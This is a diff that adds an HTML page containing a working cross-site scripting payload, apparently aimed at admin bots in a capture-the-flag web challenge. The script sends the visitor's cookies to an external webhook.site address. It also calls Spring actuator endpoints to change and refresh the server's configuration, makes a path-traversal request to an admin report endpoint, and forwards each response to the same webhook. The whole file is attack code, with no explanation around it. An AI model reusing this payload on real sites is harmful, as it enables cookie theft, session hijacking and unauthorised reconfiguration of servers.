@@ -1,0 +1,46 @@
+
+<html>
+<body>
+<script>
+  if (document.cookie.includes('FLAG=')) {
+    // Bot 2 (Report Runner)
+    fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot2&flag=' + encodeURIComponent(document.cookie));
+    document.body.innerText = "COOKIE HAS BEEN EXFILTRATED: " + document.cookie;
+  } else {
+    // Bot 1 (Editorial)
+    fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot1&msg=started');
+    let parts = window.location.pathname.split('/');
+    let myFileName = parts[parts.length - 1];
+
+    fetch('/actuator/env', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name: 'app.active-config', value: 'dev' })
+    })
+    .then(r => r.text())
+    .then(txt => fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot1&env=' + encodeURIComponent(txt)))
+    .then(() => fetch('/actuator/refresh', { method: 'POST' }))
+    .then(r => r.text())
+    .then(txt => fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot1&refresh=' + encodeURIComponent(txt)))
+    .then(() => {
+      // POST to /admin/report
+      return fetch('/admin/report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'endpoint=' + encodeURIComponent('/api/../files/' + myFileName)
+      });
+    })
+    .then(res => res.text())
+    .then(html => {
+      fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot1&report_done=1');
+      // maybe extract the report content if Bot 2's external fetch is blocked
+      fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a', {
+         method: 'POST',
+         body: html.substring(0, 4000)
+      });
+    })
+    .catch(e => fetch('https://webhook.site/8a51f2f8-8e60-4d44-a740-6c23f8a8337a?source=bot1&err=' + encodeURIComponent(e.message)));
+  }
+</script>
+</body>
+</html>
